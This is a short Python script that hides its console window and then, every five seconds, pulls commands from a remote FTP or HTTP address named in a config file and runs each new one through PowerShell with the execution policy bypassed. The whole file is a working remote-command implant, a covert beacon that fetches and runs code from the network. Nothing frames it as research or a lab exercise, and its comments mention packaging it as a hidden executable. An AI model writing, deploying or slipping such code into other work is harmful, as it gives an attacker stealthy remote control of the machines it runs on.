import os
import sys
import json
import ctypes
import subprocess
import urllib.request
import time
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse
from ftplib import FTP


# === Detect base directory (for .exe and script modes) ===
if getattr(sys, 'frozen', False):
    base_dir = Path(sys.executable).parent
else:
    base_dir = Path(__file__).parent

config_path = base_dir / "config.json"
log_file = base_dir / "startup_log.txt"
ran_cmds_file = base_dir / "commands_run.txt"


# === Hide console window (if not using --noconsole, optional) ===
def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except Exception:
        pass


# === Logging function ===
def log(message):
    try:
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"{timestamp} {message}\n")
    except Exception:
        pass


# === Load JSON configuration ===
def load_config():
    try:
        with open(config_path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as e:
        log(f"❌ Failed to load config: {e}")
        return {}


# === Fetch commands from FTP or HTTP(S) ===
def fetch_commands_from_url(url):
    try:
        parsed = urlparse(url)

        if parsed.scheme == "ftp":
            ftp_host = parsed.hostname
            ftp_port = parsed.port or 21
            ftp_user = parsed.username or "anonymous"
            ftp_pass = parsed.password or "anonymous"
            ftp_path = parsed.path.lstrip("/")

            log(f"🌐 Connecting to FTP: {ftp_user}@{ftp_host}:{ftp_port}")
            ftp = FTP()
            ftp.connect(ftp_host, ftp_port, timeout=10)
            ftp.login(ftp_user, ftp_pass)

            lines = []
            ftp.retrlines(f"RETR {ftp_path}", lines.append)
            ftp.quit()
            return [line.strip() for line in lines if line.strip()]

        else:
            with urllib.request.urlopen(url) as response:
                content = response.read().decode("utf-8").splitlines()
                return [line.strip() for line in content if line.strip()]

    except Exception as e:
        log(f"❌ Error fetching commands: {e}")
        return []


# === Execute PowerShell command ===
def run_powershell_command(cmd):
    try:
        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", cmd], check=True)
        log(f"✅ Executed: {cmd}")
    except subprocess.CalledProcessError as e:
        log(f"❌ PowerShell error: {e}")


# === Track previously run commands ===
def load_ran_commands():
    if ran_cmds_file.exists():
        try:
            with open(ran_cmds_file, "r", encoding="utf-8") as f:
                return set(line.strip() for line in f if line.strip())
        except Exception:
            return set()
    return set()

def save_ran_commands(commands):
    try:
        with open(ran_cmds_file, "a", encoding="utf-8") as f:
            for cmd in commands:
                f.write(cmd + "\n")
    except Exception:
        pass


# === Main loop ===
def main():
    hide_console()

    config = load_config()
    command_url = config.get("command_url")

    if not command_url:
        log("❌ 'command_url' missing in config.json")
        return

    log("▶️ Starting background monitoring loop...")

    try:
        while True:
            commands = fetch_commands_from_url(command_url)
            already_run = load_ran_commands()
            new_cmds = [cmd for cmd in commands if cmd not in already_run]

            if new_cmds:
                log(f"🔁 {len(new_cmds)} new commands found")
                for cmd in new_cmds:
                    run_powershell_command(cmd)
                save_ran_commands(new_cmds)

            time.sleep(5)
    except Exception as e:
        log(f"❌ Unexpected error: {e}")


if __name__ == "__main__":
    main()
